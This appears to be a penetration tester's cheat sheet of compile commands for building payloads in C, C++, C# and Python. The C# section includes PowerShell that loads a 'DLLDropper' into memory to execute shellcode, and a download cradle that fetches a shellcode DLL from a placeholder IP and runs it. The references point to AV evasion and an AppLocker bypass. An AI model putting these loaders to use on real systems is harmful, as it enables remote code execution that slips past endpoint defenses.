# 1. GAS (GNU assembler)

TODO: Write examples how to compile an assembly

`$ as`

# 2. C

* **Compile to binary**

`$ gcc -fno-stack-protector -zexecstack -static -o shell shell.c`

`$ gcc -zexecstack -static -o shell shell.c`

* **Compile to shared object**

`$ gcc -shared -fno-stack-protector -zexecstack -static -o shell.so shell.c`

* **Specify architecture

`$ gcc -m32 -fno-stack-protector -zexecstack -static -o shell shell.c`

# 3. C++

* **Compile to binary**

`$ g++ -zexestack -static -o shell shell.cpp`

* **Specify architecture

`$ g++ -m32 -zexestack -static -o shell shell.cpp`

# 4. C\#

* **Setup Dotnet SDK**

`$ sudo ./dotnet-install.sh -i /usr/share/dotnet -c 6.0`

* **Completely uninstall specific dotnet version**

```
SDK_VERSION="5.0.16"
DOTNET_VERSION="5.0.213"
DOTNET_UNINSTALL_PATH="/usr/share/dotnet"
rm -rf $DOTNET_UNINSTALL_PATH/sdk/$SDK_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.NETCore.App/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.AspNetCore.All/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.AspNetCore.App/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/host/fxr/$DOTNET_VERSION
```

* **Compile Windows executable**

`$ dotnet publish -r <win-x64 | win10-x64> -c Release -p:PublishSingleFile=true -p:PublishTrimmed=true`

`$ dotnet publish -r win-x64 -c Release -p:PublishSingleFile=true -p:AllowUnsafeBlocks=true -p:PublishTrimmed=true`

Or you can just use `build`

`$ dotnet build -r win-x64 -c Release -p:PublishSingleFile=true -p:PublishTrimmed=true`

`$ dotnet build -r win-x64 -c Release -p:PublishSingleFile=true -p:AllowUnsafeBlocks=true -p:PublishTrimmed=true`

* **Compile Windows Dynamic Linked Library**

Create ClassLibrary Project

`$ dotnet new classlib`

Compile C# DLL

`$ dotnet publish -r win-x64 -c Release --sc false -p:PublishTrimmed=true`

Allow unsafe code

`$ dotnet publish -r win-x64 -c Release -p:AllowUnsafeBlocks=true --sc false -p:PublishTrimmed=true`

Execute Shellcode

```
PS C:\> [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("DLLDropper.dll")
PS C:\> [RunDLLPublicFunc.Class1]::runner()
```

`$ cat download-cradle-dll.ps1`

---

```
$data = (New-Object Net.WebClient).DownloadData("http://<IP>/Shellcode.dll")  
$assem = [System.Reflection.Assembly]::Load($data)  
$class = $assem.GetType("Shellcode.Class1")  
$method = $class.GetMethod("<method_name>")  
$method.Invoke(0, $null)
```

# 5. Python

`$ nuitka --onefile shell.py`

### References

• [https://wiki.archlinux.org/title/.NET](https://wiki.archlinux.org/title/.NET)

• [https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html](https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html)

• [https://pentestlab.blog/2017/06/06/applocker-bypass-assembly-load/](https://pentestlab.blog/2017/06/06/applocker-bypass-assembly-load/)

• [https://nuitka.net/](https://nuitka.net/)